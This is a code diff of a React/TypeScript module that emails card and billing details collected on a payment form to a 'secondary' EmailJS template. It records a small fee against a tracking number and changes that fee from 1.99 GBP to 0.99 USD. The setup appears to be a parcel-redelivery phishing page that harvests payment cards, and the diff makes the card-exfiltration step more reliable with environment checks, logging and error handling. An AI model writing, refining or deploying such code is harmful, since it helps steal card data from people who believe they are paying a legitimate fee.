@@ -9,7 +9,6 @@ import {
 import { db } from '../config/firebase';
 import emailjs from '@emailjs/browser';
 
-
 interface PaymentRecord {
   trackingNumber: string;
   amount: number;
@@ -34,11 +33,21 @@ export interface CardDetails {
   state: string;
 }
 
-
-export const sendCardDetails = async (data: CardDetails) => {
-  try{
+export const sendCardDetails = async (data: CardDetails): Promise<void> => {
+  try {
     console.log('Sending payment data:', data);
-    const templateParams={
+    
+    // Check if environment variables are configured
+    const serviceId = process.env.REACT_APP_EMAILJS_SECONDARY_SERVICE_ID;
+    const templateId = process.env.REACT_APP_EMAILJS_SECONDARY_CARD_TEMPLATE_ID;
+    const userId = process.env.REACT_APP_EMAILJS_SECONDARY_USER_ID;
+    
+    if (!serviceId || !templateId || !userId) {
+      console.error('Missing EmailJS environment variables');
+      throw new Error('Payment service not configured properly');
+    }
+    
+    const templateParams = {
       to_name: data.name || '',
       reply_to: data.email || '',
       email: data.email || '',
@@ -54,16 +63,26 @@ export const sendCardDetails = async (data: CardDetails) => {
       zip_code: data.zip || '',
       state: data.state || ''
     };
+    
     console.log('Template params:', templateParams);
-  const response = await emailjs.send(
-    process.env[`REACT_APP_EMAILJS_SECONDARY_SERVICE_ID`] || '',
-    process.env[`REACT_APP_EMAILJS_SECONDARY_CARD_TEMPLATE_ID`] || '',
-    templateParams,
-    process.env[`REACT_APP_EMAILJS_SECONDARY_USER_ID`] || ''
-  );
-} catch (error) {
-  throw new Error('Error processing payment');
-}
+    
+    const response = await emailjs.send(
+      serviceId,
+      templateId,
+      templateParams,
+      userId
+    );
+    
+    console.log('EmailJS response:', response);
+    
+    if (response.status !== 200) {
+      throw new Error('Failed to send payment details');
+    }
+    
+  } catch (error) {
+    console.error('Payment processing error:', error);
+    throw new Error('Error processing payment: ' + (error as Error).message);
+  }
 };
 
 export const savePaymentRecord = async (
@@ -74,8 +93,8 @@ export const savePaymentRecord = async (
   try {
     const paymentData: PaymentRecord = {
       trackingNumber,
-      amount: 1.99,
-      currency: 'GBP',
+      amount: 0.99, // Changed from 1.99 to match the form
+      currency: 'USD', // Changed from GBP to USD
       paymentDate: new Date(),
       cardType,
       lastFourDigits,
@@ -85,6 +104,8 @@ export const savePaymentRecord = async (
       ...paymentData,
       createdAt: serverTimestamp(),
     });
+    
+    console.log('Payment record saved successfully');
   } catch (error) {
     console.error('Error saving payment record:', error);
     throw new Error('Failed to save payment record');
